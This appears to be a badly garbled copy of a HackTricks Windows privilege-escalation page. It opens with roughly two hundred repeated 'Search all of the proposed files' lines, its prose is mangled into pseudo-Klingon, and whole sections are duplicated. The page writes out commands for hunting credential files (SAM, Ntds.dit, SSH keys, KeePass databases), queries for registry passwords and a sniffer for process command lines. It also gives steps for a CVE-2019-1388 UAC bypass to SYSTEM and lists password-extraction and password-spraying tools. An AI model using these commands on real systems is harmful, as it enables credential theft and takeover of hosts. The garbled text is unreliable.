**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed files:**

**Search all of the proposed
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### qawHaqDI' RecycleBin

tlhIngan Hol:
Bin vItlhutlhlaHchugh, qawHaqDI' credentials laH

**passwords recover** programs vItlhutlhlaHlaH, [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### registry vItlhutlhlaH

**credentials** registry keys vItlhutlhlaHlaH
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Qapla'! openssh keys jImej registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome or Firefox** passwords vItlhutlh dbs check.\
Browsers history, bookmarks je favourites check, **passwords** vItlhutlh stored.

Tools to extract passwords from browsers:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system vItlhutlh technology, different languages software components **intercommunication** vItlhutlh. COM component **class ID (CLSID)** vItlhutlh identified je component functionality **interface ID (IID)** vItlhutlh identified.

COM classes je interfaces registry **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** je **HKEY\_**_**CLASSES\_**_**ROOT\Interface** vItlhutlh defined. Registry **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.** created.

CLSIDs registry vItlhutlh child registry **InProcServer32** vItlhutlh, **default value** pointing **DLL** je value **ThreadingModel** vItlhutlh **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) je **Neutral** (Thread Neutral).

![](<../../.gitbook/assets/image (638).png>)

Basically, **DLLs overwrite** vItlhutlh, **DLL** executed, user different executed, **escalate privileges** vItlhutlh.

Attackers COM Hijacking persistence mechanism vItlhutlh learn:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Generic Password search in files je registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Search for a file with a certain filename**

**Search for a file with a certain filename**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Search the registry for key names and passwords**

**Search the registry for key names and passwords**

**Search the registry for key names and passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### qawHaqDI'wI' Dujmey

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **MSF** plugin **vItlhutlh** **credentials** **qawHaq** **metasploit POST module** **automatically execute** **vIlegh**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) **passwords** **qawHaq** **files** **search** **automatically**.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) **passwords** **extract** **great tool**.

**SessionGopher** **qawHaq** **sessions**, **usernames** **passwords** **tools** **data** **clear text** **search** (PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP) **vIlegh**.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**Qa'chuq** **SYSTEM** **ghItlh** **process** (`OpenProcess()`) **ghItlh** **full access** **ghItlh** **process** **cha'** (`CreateProcess()`) **ghItlh** **low privileges** **'ej** **open handles** **main process** **yInob**.\
**vaj** **low privileged process** **ghItlh** **full access** **grab** **open handle** **privileged process created** **'ej** `OpenProcess()` **inject** **shellcode**.\
[**'Iw** **example** **more information** **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[**'Iw** **post** **more complete explanation** **how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**pipes**, **'oH** **shared memory segments**, **process communication** **'ej** **data transfer**.

**Windows** **provide** **feature** **Named Pipes**, **allow** **unrelated processes** **share data**, **even** **different networks**. **'Iv** **client/server architecture**, **roles** **named pipe server** **'ej** **named pipe client**.

**'Iv** **data** **sent** **pipe** **client**, **server** **set up** **pipe** **ghItlh** **ability** **take on the identity** **client**, **assuming** **SeImpersonate** **rights**. **'Iv** **privileged process** **communicates** **pipe** **mimic** **provide** **opportunity** **gain higher privileges** **adopting** **identity** **process** **interacts** **pipe** **established**. **'Iw** **instructions** **executing** **attack**, **helpful guides** **found** [**'Iw**](named-pipe-client-impersonation.md) **'ej** [**'Iw**](./#from-high-integrity-to-system).

**'ej** **following tool** **allows** **intercept** **named pipe communication** **tool** **burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **'ej** **tool** **allows** **list** **'ej** **see** **pipes** **find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitoring Command Lines for passwords**

**user** **shell** **QaQ** **scheduled tasks** **'ej** **processes** **executed** **pass credentials on the command line**. **script** **below** **captures process command lines every two seconds** **compares** **current state** **previous state**, **outputting** **differences**.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

If you have access to the graphical interface (via console or RDP) and UAC is enabled, in some versions of Microsoft Windows it's possible to run a terminal or any other process such as "NT\AUTHORITY SYSTEM" from an unprivileged user.

This makes it possible to escalate privileges and bypass UAC at the same time with the same vulnerability. Additionally, there is no need to install anything and the binary used during the process, is signed and issued by Microsoft.

Some of the affected systems are the following:

---

## Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

If you have access to the graphical interface (via console or RDP) and UAC is enabled, in some versions of Microsoft Windows it's possible to run a terminal or any other process such as "NT\AUTHORITY SYSTEM" from an unprivileged user.

This makes it possible to escalate privileges and bypass UAC at the same time with the same vulnerability. Additionally, there is no need to install anything and the binary used during the process, is signed and issued by Microsoft.

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
To exploit this vulnerability, it's necessary to perform the following steps:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Then **read this to learn about UAC and UAC bypasses:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **pass to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](./#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](./#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking.md)**.**

### **From Administrator or Network Service to System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Qawane'wI'

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>qaStaHvIS (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **qaStaHvIS** **cybersecurity company**? **HackTricks** **company advertised** **company advertised in HackTricks**? **PEASS** **HackTricks** **PEASS** **HackTricks in PDF**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **SUBSCRIPTION PLANS** **SUBSCRIPTION PLANS**!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **PEASS Family** [**The PEASS Family**](https://opensea.io/collection/the-peass-family), [**NFTs**](https://opensea.io/collection/the-peass-family) **NFTs** [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **official PEASS & HackTricks swag** [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
